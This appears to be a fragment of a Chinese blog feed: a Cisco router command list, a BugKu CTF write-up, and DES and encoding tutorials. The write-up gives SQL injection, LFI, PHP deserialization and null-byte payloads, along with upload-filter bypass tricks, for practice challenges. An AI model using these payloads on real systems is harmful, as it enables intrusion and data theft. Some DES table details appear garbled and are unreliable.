设备配置时钟，DTE设备不用配置。<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0   //配置IP地址<br>Router(config-if)#no shutdown</p><p>4常用的show命令：<br>Router#show running-config     查看路由器运行配置文件<br>Router#show ip interface s0/0    查看接口协议相关信息<br>Router#show ip route     查看路由信息。<br>Router#show version      查看路由器版本<br>Router#show flash:        查看路由器flash<br>Router#show history           查看历史命令记录<br>Router#show arp     查看路由器ARP表<br>Router#show clock    查看路由器的时间设置<br>Router#show ip interface brief     查看接口简要信息<br>Router#show interfaces s0/0     查看接口物理相关信息<br>Router#show users     查看当前所有连接到路由器的用户<br>Router#show session     查看会话记录，经常在终端上使用<br>Router#show controllers s0/0    查看特定接口的硬件信息<br>Router#show ip protocols     查看全局和接口的第三层协议的特定状态<br>Router#show startup-config    查看下次路由器重新加载时将要使用的配置<br>Router#show cdp neighbors    CDP思科发现协议，查看直连的相邻设备及其详细信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CCNP&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-3-2&lt;/small&gt;&lt;/center&gt;
&lt;p&gt;GNS&lt;br&gt;
Cisco-packet-tracer&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/small&gt;&lt;/cente</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="计算机网络" scheme="http://blog.dvkunion.cn/tags/计算机网络/"/>
    
    <category term="思科认证" scheme="http://blog.dvkunion.cn/tags/思科认证/"/>
    
  </entry>
  
  <entry>
    <title>BugKu</title>
    <link href="http://blog.dvkunion.cn/2019/02/26/BugKu/"/>
    <id>http://blog.dvkunion.cn/2019/02/26/BugKu/</id>
    <published>2019-02-26T14:20:40.000Z</published>
    <updated>2022-01-05T05:43:55.911Z</updated>
    
    <content type="html"><![CDATA[<h1>BugKu</h1><h3><b>0x00- - 前言</b></h3><p>久仰BugKu大名，这里记一下Bugku的题目。</p><h3><b>0x01- - Web</b></h3><p><b>01-web2</b></p><p>打开是加速的滑稽js....<br>F12得到key,一样的签到题套路</p><p><b>02-计算器</b></p><p>打开是一个验证码一样的计算图片，但是一般的结果都是两位数以上而输入框只能输入1位。<br>右键审查元素直接修改html属性即可。</p><p><b>03-web基础$_GET</b></p><p>打开是一段源码。<br>要求GET方法获得一个what变量的值为flag。<br>url添加?what=flag即可。</p><p><b>04-web基础$_POST</b></p><p>同上题目，方法变为了POST。<br>上hackbar直接可以拿到flag。</p><p><b>05-矛盾</b></p><p>又是一段php。<br>GET得到num,要求num是非数字(!is_numeric)但是只有num==1才能够输出flag。<br>这里num==1是弱类型，所以我们只要输入一个带有字母且开头为1的字符串即可。</p><p><b>06-web3</b></p><p>打开疯狂js弹窗。<br>两种方式:第一禁用浏览器js,F12即可看到flag的注释。<br>第二直接view-source，看到注释掉的html编码的flag。</p><p><b>07-域名解析</b></p><p>按照题目提示修改host文件(Linux:/etc/hosts Win:C:\windows\system32\drivers\etc)即可。<br>大佬说BP改一下host也可以实现。</p><p><b>08-你必须让他停下</b></p><p>打开题目1s一次自动刷新。<br>同样禁用js手动刷出flag即可。<br>BP抓包后手动GO几次也能获得。</p><p><b>09-本地包含</b></p><p>打开只有一个123,按照题目提示是一个LIF。<br>直接盲猜flag.php即可。。。</p><blockquote><p>p.s:看了一下别人的wp发现原题好像不是这样的，，，给了一个源码...<br>include &quot;flag.php&quot;;<br>$a = @$_REQUEST['hello'];<br>eval( &quot;var_dump($a);&quot;);<br>show_source(__FILE__);</p></blockquote><p><b>10-变量1</b></p><p>这题没做出来，缺少了对php 可变变量的知识。<br>题目是一段源码，提示flag在一个变量中，要求GET一个arg值，arg是一个可变变量。<br>让arg=GLOBALS输出全局变量即可。</p><p><b>11-web5</b></p><p>打开有一个输入框，提示JSfuck，F12查看源码发现隐藏的jsfuck。<br>这里有一个坑点，F12看到的是省略后的代码，无法运行。<br>使用view-source查看源码，得到源码扔console台即可。</p><p><b>12-头等舱</b></p><p>。。。看到带有头、head的东西，直接F12条件反射network。<br>看请求包即可得到flag。</p><p><b>13-网站被黑</b></p><p>这题也搞了很久。。。题目提示是一个很没水平的东西???<br>做的时候因为打开后就没啥提示，没有啥思路。<br>扔扫描器扫去把，直接扫到了一个后台。<br>要输入密码。<br>没提示我上哪弄密码去。。。<br>继续扔工具爆破去吧。<br>得到密码拿到flag...</p><blockquote><p>的确很坑。</p></blockquote><p><b>14-管理员系统</b></p><p>打开发现是一个登录窗口，F12发现一个base64注释。解出来是test123。<br>尝试admin登陆，结果有IP限制。<br>改xff即可得到flag。</p><p><b>15-web4</b></p><p>打开提示看看源码，F12启动。<br>看到一串js，都是%扔url解一下。<br>得到的是一个js函数。<br>有一个坑点，注意p1和p2的拼接部分插入了一段，所以密码应该是p1的结尾+插入部分+p2开头。</p><p><b>16-flag在index里</b></p><p>打开是一个触发连接。由题目提示flag在index里面，应该是让我们去查看index.php的内容。<br>点击click之后发现跳转的url是明显的符合LFI漏洞的形式。我们尝试去查看index.php但是没有显示出来。<br>尝试使用php://filter封装成base64进行查看。</p><p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>直接base64解码得到flag。<br>这里一开始用的是php://input。查看到源码之后发现被过滤掉了input和../以及tp、data等关键词。</p><p><b>17-输入密码查看flag</b></p><p>打开提示是一个5位数字的密码。直接bp爆破。</p><p><b>18-点击100万次</b></p><p>这题做了一次又忘了...<br>有关js的题目也是没有条件反射。<br>点开是一个饼干...要你点击100万次就会得出flag。<br>F12 可以看到饼干计数的js代码。<br>js在计数的时候如果计数到了100万就会发出post请求。我们直接伪造这个请求即可。<br>得到flag。</p><p><b>19-备份是个好习惯</b></p><p>提示有备份。扫描扫出index.php.bak。<br>查看源码，要求得到key1和key2不相同但md5相同。md5判断处为弱类型，0e绕过。<br>有一个坑点，这里他使用str_replace把key替换成了空字符串。因此需要使用url编码进行绕过。</p><p><b>20-成绩单</b></p><p>打开发现一个输入框，输入id查询成绩。<br>fuzz发现存在sql注入漏洞。<br>走流程注入：<br><code>1' order by 4 #</code>检测表单长度<br><code>-1' union select 1,2,3,4 #</code>查看元素位置<br><code>-1' union select 1,database(),user(),version() #</code>获取主要信息<br><code>-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version() #</code>得到表名<br><code>-1' union select 1,(select * from fl4g),user(),version() #</code>直接查询表名得到flag。</p><blockquote><p>回数据库继续熟悉那张特殊的表</p></blockquote><p><b>21-秋名山老司机</b></p><p>打开提示要求在2s内计算一个长串的表达式。<br>python写个eval脚本即可。<br>动手写一下吧...不然一直眼高手低。<br>。。。这么个东西也写了15多分钟。。。</p><pre class=" language-language-python"><code class="language-language-python">import requestsurl='http://123.206.87.240:8002/qiumingshan/index.php's = requests.Session()r = s.get(url)express=r.textexpress=express[159:]rexp=''for i in express:if i == '=':breakelse:rexp=rexp+iprint(rexp)ans=eval(rexp)r=s.post(url,data={'value':ans})print(r.text)</code></pre><p><b>22-速度要快</b></p><p>打开页面，抓包发现回复内容内包含flag字段，并且源码带有注释掉的提示:要求post一个margin的值。<br>对flag解码两次base64可以得到后面的几个数字，应该就是margin。<br>但是算出来了之后???要求我快点?<br>行吧...这个页面刷新一次就会更新一次那个flag的值...<br>正好趁着热乎...把上面的py代码在熟练一次吧。<br>注意requests必须使用session请求保持会话连接。</p><pre class=" language-language-python"><code class="language-language-python">import requestsimport base64url='http://123.206.87.240:8002/web6/index.php's = requests.Session()r = s.get(url)exp=r.headers['flag']exp=exp[44:]exp=base64.b64decode(exp)exp=base64.b64decode(exp)exp=exp.decode('utf-8')r=s.post(url,data={'margin':exp})print(r.text)</code></pre><blockquote><p>ok,我的字符串操作是真的烂...</p></blockquote><p><b>23-cookies欺骗</b></p><p>打开发现url参数filename存在一个base64的加密。解码为key.txt。是一串不</p><p><b>24-never give up</b></p><p>打开看到url参数以为是注入题目...结果没有反馈sql又不会了...<br>日常F12，得到提示。1p.html转向Bugku的论坛。<br>抓包看一下，发现是一个304 modified。<br>删去转304的请求语句If-Modified得到页面的源码，是一段js的代码。<br>里面有一个很长的变量word。并且在 outword()函数中进行了url解码。<br>手动url解码，得到另一段代码，是实现跳转的js以及注释掉的base64。<br>手动base64解码，又得到了一段php代码....<br>做到这里就想起来怎么做的了。。。这里很坑。<br>看到了一个flag的txt文档，试着访问一下就直接能够得到flag...<br>如果按照实际来做php审计的话，需要绕过下面几个函数：<br>stripos(字符串a，字符串b) 函数查找字符串b在字符串a中第一次出现的位置（不区分大小写）。</p><p>file_get_contents 将整个文件读入一个字符串</p><p>strlen() 函数返回字符串的长度</p><p>!$_GET[‘id’]并且id==0：令id=%00或者令id=.字符串都可以绕过</p><p>substr() 函数返回字符串的一部分。 substr(string,start,length) ，length参数可选。如  substr($b,0,1)  就是在参数b里面 ，从0开始返回1个长度的字符串</p><p>eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;)    就是判断&quot;1114&quot;这个字符串里面是否有符合&quot;111&quot;.substr($b,0,1)这个规则的</p><p>这里被坑住了。一直在考虑如何寻找一个编码方式能让substr不识别但是eregi识别出来...<br>这里绕过eregi的方式是用%00截断，使得判断eregi(&quot;111&quot;,&quot;1114&quot;)成立。</p><p>payload:hello.php?id=0e123&amp;a=php://input&amp;b=%0023456</p><p><b>25-welcome to bugku</b></p><p>一个经典的题目<br>打开提示我不是bugku的会员....<br>F12得到注释部分的源码提示。<br>按照源码要求一步一步的走吧...<br>第一个变量txt:考察php://input封装。<br>第二个变量file：考察php://filter封装，根据提示查看hint.php源码。<br>hint内存在一个flag的Class。<br>我们再查看index.php的源码...发现file直接被过滤了...所以我们不能直接读到flag.php<br>但是在后面有一个对password的序列化，结合hint内的class的内容，我们可以构造php反序列化payload。<br><code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;,s:8:&quot;flag.php&quot;;}</code><br>作为hint.php的参数进行传输。即可得到Flag</p><p>最后放一个payload:<br><code>index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;,s:8:&quot;flag.php&quot;;}</code></p><p><b>26-过狗一句话</b></p><p>这题已经被日掉了。。。不能做了<br>靠着广大网友的wp大概看一下题目。应该是给的一句话木马。传入参数s即可进行命令执行，寻找flag文件即可。</p><p><b>27-字符?正则?</b></p><p><b>28-前女友</b></p><p>...我不知道为什么这题我做了很久...还是后台更新过了...<br>就很不明白为什么一开始眼瞎的看不到F12源码中的一个提示txt连接。。。<br>查看txt得到提示代码...一个弱类型md5比较，加一个数组绕过strcmp函数。。。<br>...为什么第一次做的时候啥都没看到?</p><p><b>29-login1</b><br>提示sql约束攻击...<br>终于在寒假之后对常见的一些sql攻击有了一定的了解...回过来把这题做掉了。<br>按照提示我们使用Sq约束攻击，首先注册一个用户名为 amdin'# 的用户，设置密码后返回登录，在登陆时候使用admin的用户名和注册时候使用的密码。<br>登陆成功即可拿到flag。</p><p><b>30-你从哪里来</b></p><p>打开链接得到提示：我们是从Google来的吗？<br>修改referer得到Flag。<br>坑点：google用的是https协议...</p><p><b>31-md5 collision</b></p><p>这题bugku的意思应该是直接连接到南邮的题目。。。所以少了题目描述。。。<br>去查南邮的题目会发现给了你源码...只要输入等于他给的md5的值的a即可。。。<br>行吧...</p><p><b>32-程序员本地网站</b><br>要求从本地访问，修改x-forwarded-for即可。</p><p><b>33-各种绕过</b><br>php审计。<br>1.首先url编码id=margin<br>2.数组绕过uname和passwd的sha1加密</p><p><b>34-web8</b><br>依旧是php审计。<br>只要get的ac值和fn-php://input封装传输的值相同即可。</p><p><b>35-细心</b></p><p>题目提示变成admin。<br>但是打开看到的是一个404页面...<br>一开始以为是服务器炸了。<br>抓包看一下，没啥收获。<br>没办法，扫去吧。<br>扫到了一个robots.txt，得到提示：resusl.php<br>然后发现了下一步的提示：x参数要和password相同。。。<br>以为是什么骚操作绕过。。。结果直接盲猜x=admin即可。。。</p><p><b>36-求getshell</b><br>按照要求，需要上传一张image的php。<br>一开始以为是上传一句话菜刀...结果回显会默认把上传的文件转变成随机编码的jpg文件...<br>跟着大佬做...bp抓包之后将Content-Type: Multipart/form-data;像这样改成大写...这样可以过waf。<br>然后使用如下的后缀名php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名）...并且将文件的Content-Type修改为image/jpg的格式。<br>即可得到flag。</p><p><b>37-INSERT INTO注入</b></p><p>题目给了源码。源码可以看到两个地方。<br>1:ip的传入值和函数getip()有关，这个函数会将数据包中的HTTP_X_FORWARDED_FOR赋值给ip<br>2:sql执行语句：insert into client_ip (ip) values ('$ip')</p><p><b>38-这是一个神奇的登陆框</b></p><p>熟悉了Sqlmap以后直接这题就跑出来了...工具真香。<br>Post提交的参数中admin_name参数存在注入。<br>直接爆表爆库跑出flag即可...</p><p><b>39-多次</b></p><p><b>40-PHP_encrypt_1</b></p><h3><b>0x02- - Misc</b></h3><p><b>01-签到题</b></p><p>关注公众号即可</p><p><b>02-这是一张单纯的图片</b></p><p>给了张图片。隐写流程走一遍<br>hex打开发现结尾的html编码的Flag</p><p><b>03-隐写</b></p><p>CRC校验出现错误，调节高度位，得到flag</p><p><b>04-telnet</b></p><p>流量分析题，再根据题目提示，联想到Telnet是明文传输。<br>寻找telnet的登录密码。<br>懒得仔细看了...流量也很干净，直接追踪流看到了明文传输的密码得到flag。</p><p><b>05-眼见非实(ISCCCTF)</b></p><p>一个没有后缀名的文件,file查看文件类型也是zip<br>添加后缀名之后发现该压缩文件内有一个无法打开的docx文件<br>hex查文件头发现其实还是一个zip文件(office文档皆压缩)，再次修改文件后缀名...结果什么都没发现。<br>整理思路(查看wp)...<br>思路是对的，，，眼神不好使。。。flag在document里。。。</p><p><b> 06-啊哒</b></p><p>(终于遇到一个走流程的题了...)<br>压缩文件，解压出一个jpg。<br>binwalk 发现压缩包<br>foremost 提取压缩包<br>zip 打开压缩包发现flag.txt有密码<br>zip伪加密 尝试失败<br>crc爆破 22位爆破难度过高<br>整理思路(继续查看wp)...<br>行吧，还得去看图片的详细信息...得到一串奇怪的字符串<br>bp转一下ascii hex 得到解密密码。<br>拿到flag...</p><p><b>07-又一张图片，还单纯吗</b></p><p>(这次的确是一个走流程的题目了...)<br>jpg图片，直接formost即可得到flag...</p><p><b>08-猜</b></p><p>图片是一个缺了半张脸的女人，要求的flag是这个女人的名字的全拼写。<br>社工题，搜吧。<br>很容易搜到了相关连接。</p><p><b>09-宽带信息泄露</b></p><p>这个根据上一次安恒赛的一道题学习到的一个可以查看宽带备份文件密码的工具。<br>上工具读出来文件，找用户名即可。<br>文件仔细读一读救出来了。</p><p><b>10-隐写2</b></p><p>这次我记住了，这么嚣张的图片先从最简单的地方开始查起<br>文件属性直接看到hint:网络安全工作室在哪?<br>不知道，继续走流程<br>binwalk :发现zip<br>foremost :得到zip<br>然后得到 ：flag.rar和又一个提示文件。<br>提示文件说了三个人物和hint:斗地主。<br>...没猜出来(看了大佬的想法...键盘上的kqj分别对应键盘上的871...)<br>得到第三章图片,hex找到了flag。<br>提交出现问题，发下内部是base64加密，扔bp编码一下，得到真正的flag。</p><p><b>11-多种方法解决</b></p><p>提示我们去找二维码。<br>HEX发现提示：图片格式的base64加密的二维码<br>保存扫描一下得到flag。</p><p><b>12-闪的好快</b></p><p>一个闪烁的gif二维码，使用gif切割工具，<br>18张图片...一个图一个字母...<br>慢慢扫吧。</p><p><b>13-come_game</b></p><p><b>14-白哥的鸽子</b></p><p>一个jpg文件，先看一下图片是啥<br>是一只鸽子。。。</p><p><b>15-Linux</b></p><p>提示都是Linux了，先扔file看一下。<br>linux etx3文件，./无法执行。<br>尝试cat 一下直接拿到了flag。</p><p><b>16-隐写3</b></p><p><b>就五层你能解开嘛</b><br>提示很到位，一共五关。<br>第一关:crc32碰撞。.py脚本跑一下。得到解压密码:进入到了第二层。<br>第二关：维吉尼亚密码。</p><h3><b>0x03- - Misc</b></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;BugKu&lt;/h1&gt;
&lt;h3&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;久仰BugKu大名，这里记一下Bugku的题目。&lt;/p&gt;
&lt;h3&gt;&lt;b&gt;0x01- - Web&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;&lt;b&gt;01-web2&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;打开是加速的滑稽js...</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>再也没有看不懂的摘要!</title>
    <link href="http://blog.dvkunion.cn/2019/02/18/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E6%91%98%E8%A6%81!/"/>
    <id>http://blog.dvkunion.cn/2019/02/18/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E6%91%98%E8%A6%81!/</id>
    <published>2019-02-18T14:44:32.000Z</published>
    <updated>2022-01-05T12:31:13.651Z</updated>
    
    <content type="html"><![CDATA[<h1>再也没有看不懂的摘要!</h1><hr><center><small>2019-2-18</small></center>昨天写完了编码部分，于是决定继续把剩下的签名和加密写完。]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;再也没有看不懂的摘要!&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-2-18&lt;/small&gt;&lt;/center&gt;
昨天写完了编码部分，于是决定继续把剩下的签名和加密写完。
</summary>
      
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="密码学" scheme="http://blog.dvkunion.cn/tags/密码学/"/>
    
    <category term="数字签名" scheme="http://blog.dvkunion.cn/tags/数字签名/"/>
    
  </entry>
  
  <entry>
    <title>再也没有看不懂的密码!</title>
    <link href="http://blog.dvkunion.cn/2019/02/18/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E5%AF%86%E7%A0%81!/"/>
    <id>http://blog.dvkunion.cn/2019/02/18/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E5%AF%86%E7%A0%81!/</id>
    <published>2019-02-18T14:44:08.000Z</published>
    <updated>2019-05-24T16:11:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1>再也没有看不懂的密码!</h1><hr><center><small>2019-2-18</small></center>昨天写完了编码部分，于是决定继续把剩下的加密和签名写完。<br><center><small>华丽的分割线</small></center><hr><h3><b>0x00- - 简介</b></h3><p>看完了编码，我们在想一下什么是加密?<br>在信息传输的过程中，编码后的数据很容易的就被还原成原文。为了防止在信息传输的过程中被其他人恶意窃取或是监听，我们需要对数据进行加密：将是以某种特殊的算法改变原有的信息数据，使得未授权的用户即使获得了已加密的信息，但因不知解密的方法，仍然无法了解信息的内容。</p><p>加密的目的在于隐藏原本的信息内容以保证数据的安全性。</p><p>列一下目录：</p><ul><li><b>对称加密</b><ul><li><font color="red">换位加密</font><ul><li>凯撒密码</li><li>栅栏密码</li></ul></li><li>栅栏密码</li><li>猪圈密码</li></ul></li><li><b>非对称加密</b></li></ul><p><b>DES加密</b></p><p><b>定义</b><br>DES(Data Encrypthion Standard) 出于1977年美国,是一种将64 bits明文通过56 bits 密钥(密钥总长为64 bits , 每 7 bits 进行 1 bit 校验位) 加密成64 bits密文的算法。<br>加密时进行分组：每组长度为密钥的长度，然后每组数据和密钥进行位运算，迭代16次之后就是加密后的密文。</p><p><b>加密算法</b><br>作为第一个了解的加密方式，感觉密码和编码完全不在一个级别上...</p><p>先摆出DES的加密流程图吧：<br><img src="https://s2.ax1x.com/2019/02/19/kguoLT.jpg" class="lazyload" data-srcset="https://s2.ax1x.com/2019/02/19/kguoLT.jpg" srcset="/css/images/overlay.gif" alt="kguoLT.jpg"><br>首先要了解DES是如何加密的，要分为三个部分：第一,明文通过IP变换这个IP变换的规则；第二，L0,R0的生成规则以及K0密钥的生成规则；第三，加密算法f()。</p><p>了解了这些之后，这个图片就很清晰了：首先明文通过IP变换，将明文的位置打乱；其次将打乱后的明文进行一个重复16次的过程--分成L0,R0两部分，R0作为下一层的L1，之后与K1通过加密算法f,得到的结果与L0异或就是R1，在进行了16次之后再讲IP进行逆运算还原，得到的结果就是密文。</p><p>然后我们开始逐一了解这几个部分。</p><p>首先是IP变换。对于每一组 64 bits数据，要通过下面的表进行位置变换：</p><p><img src="https://s2.ax1x.com/2019/02/19/kgK1Yj.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/02/19/kgK1Yj.png" srcset="/css/images/overlay.gif" alt="kgK1Yj.png"></p><p>这个比较容易理解，我们把之前的 64 bits数据看做&quot;123456789.... 61626364&quot;这样的顺序排列，按照图片上的编号重新排一下就是IP变换了。<br>IP变换之后的前32位就是L0，后32位就是R0(很明显的偶数和奇数分列)。</p><p>做完这一步我们需要的是将R0和K1进行通过算法f得出结果。那么我们先要知道k1是怎么得来的。<br>首先我们将64 bits密钥通过PC-1表转化为56 bits</p><p>PC-1表：<br>57,49,41,33,25,17,9,1,<br>58,50,42,34,26,18,10,2,<br>59,51,43,35,27,19,11,3,<br>60,52,44,36,63,55,47,39,<br>31,23,15,7,62,54,46,38,<br>30,22,14,6,61,53,45,37,<br>29,21,13,5,28,20,12,4</p><p>我们将56 bits的密钥平均分为C0和D0,C0 28bits,D0 同样28 bits。<br>这里同样有一个IP变换的过程，遵循铭文的IP表。所以C0的数据位置应该为：</p><p>57,49,41,33,25,17,9,<br>1,58,50,42,34,26,18,<br>10,2,59,51,43,35,27,<br>19,11,3,60,52,44,36,</p><p>D0为：</p><p>63,55,47,39,31,23,15,<br>7,62,54,46,38,30,22,<br>14,6,61,53,45,37,29,<br>21,13,5,28,20,12,4</p><p>在每一轮，C0和D0通过下表进行移位：<br><a href="https://imgchr.com/i/kgM4bT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/19/kgM4bT.md.png" class="lazyload" data-srcset="https://s2.ax1x.com/2019/02/19/kgM4bT.md.png" srcset="/css/images/overlay.gif" alt="kgM4bT.md.png"></a></p><p>由此我们可以算出C1：</p><p>49,41,33,25,17,9,1,<br>58,50,42,34,26,18,10,<br>2,59,51,43,35,27,19,<br>11,3,60,52,44,36,57</p><p>D1:</p><p>55,47,39,31,23,15,7,<br>62,54,46,38,30,22,14,<br>6,61,53,45,37,29,21,<br>13,5,28,20,12,4,63</p><p>然后开始合并，合并后去掉第9、18、22、25、35、38、43、54位，从56位变成48位，再按PC-2表的位置置换。结果就是K1。</p><p>PC-2表如下：<br>14,17,11,24,1,5,<br>3,28,15,6,21,10,<br>23,19,12,4,26,8,<br>16,7,27,20,13,2,<br>41,52,31,37,47,55,<br>30,40,51,45,33,48,<br>44,49,39,56,34,53,<br>46,42,50,36,29,32</p><p>得到K1之后我们发现，K1是48位而R0只有32位，这时候就需要使用扩展置换E来把R0转化为48位。<br>32,1,2,3,4,5,<br>4,5,6,7,8,9,<br>8,9,10,11,12,13,<br>12,13,14,15,16,17,<br>16,17,18,19,20,21,<br>20,21,22,23,24,25,<br>24,25,26,27,28,29,<br>28,29,30,31,32,1<br>这个转换很容易就看出规律...<br>转化完成后直接和K1进行异或。</p><p>之后进入到S盒：将48 bits数据切换成32 bits。<br>这里需要8个S表。每个S盒子有6 bits输入，4 bits 输出。但是每个S表有 64 bits。<br>S1:<br>14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,<br>0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,<br>4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,<br>15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13,<br>S2:<br>15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,<br>3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,<br>0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,<br>13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9,<br>S3:<br>10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,<br>13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,<br>13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,<br>1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12,<br>S4:<br>7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,<br>13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,<br>10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,<br>3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14,<br>S5:<br>2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,<br>14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,<br>4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,<br>11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3,<br>S6:<br>12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,<br>10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,<br>9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,<br>4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13,<br>S7:<br>4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,<br>13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,<br>1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,<br>6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12,<br>S8:<br>13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,<br>1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,<br>7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,<br>2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11,<br>S盒子的计算较为简单：假设输入的6 bits为 101010，首先取这6 bits的第一位和最后一位，构成一个二进制数：10，表示S表中的横向；剩下四位则是纵向，所以该输入在S表8中的输出应该是12，对应二进制1100。这样就是将 6 bits数据转化成了4 bits。<br>S置换结束了之后，数据变为32 bits，进行P表置换。<br>P表：<br>16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,<br>2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25,<br>置换结束后将这32位数据和一开始的L0异或，完成这一轮的迭代。</p><p>经过16次的迭代后，这个过程我们成为函数F。我们得到了L16 和R16，进入最后一步:p逆置换。<br>P逆置换表如下：<br>40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,<br>38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,<br>36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,<br>34,2,42,10,50,18,58 26,33,1,41, 9,49,17,57,25,</p><p>经过逆置换的输出就是对应的密文。</p><p><b>总结</b><br>总结一下DES的加密过程：<br>明文分组/填充 -&gt; IP置换 -&gt; 分化L0,R0 -&gt; 进入f函数加密得到R16,L16 -&gt; 进入逆置换得到密文</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;再也没有看不懂的密码!&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2019-2-18&lt;/small&gt;&lt;/center&gt;
昨天写完了编码部分，于是决定继续把剩下的加密和签名写完。
&lt;br&gt;
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/small&gt;&lt;/center&gt;</summary>
      
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="密码学" scheme="http://blog.dvkunion.cn/tags/密码学/"/>
    
    <category term="加密认证" scheme="http://blog.dvkunion.cn/tags/加密认证/"/>
    
  </entry>
  
  <entry>
    <title>再也没有看不懂的编码！</title>
    <link href="http://blog.dvkunion.cn/2019/02/17/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E7%BC%96%E7%A0%81!/"/>
    <id>http://blog.dvkunion.cn/2019/02/17/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E7%BC%96%E7%A0%81!/</id>
    <published>2019-02-17T14:40:52.000Z</published>
    <updated>2022-01-04T11:18:48.776Z</updated>
    
    <content type="html"><![CDATA[<h1>再也没有看不懂的编码！</h1><hr><center><small>2018-12-22</small></center><p>这一阵子做的比赛突然感觉，自己基础真的是太差了。月赛的base32码硬生生以为是base64，这才反应过来看到编码就直接扔一波工具解码碰大运，错了乱码就解不开了。其实对于编码的内容和性质、一般的形式等等跟不讲不出什么所以然来。吃了这次的亏以后，决定重新一点一点一步一步的从最基本的东西开始积累，不要在急着做一些表面的东西。<br>总之，工具虽好,emmmmmmmm。</p><center><small>2019/2/17</small></center><p>终于把这篇文章算是更新完结了。<br>揣摩了大佬的编码讲解文章，修改和增添了一些内容。<br>在未来遇到更多的编码时会不断的向这其中添加。</p><br><center><small>华丽的分割线</small></center><hr><h3><b>0x00- - 简介</b></h3><p>什么是编码?区分编码和加密以及hash在于,编码只是信息的转换，其目的不在于隐蔽消息的内容，而在于方便传输以及保证传输数据内容不失真等。重点在转换为方便计算机传输的二进制数据。<br>所以个人认为，编码处理后的信息，仍可以视为是明文传输。</p><p>列一下目录：</p><ul><li><b>normal 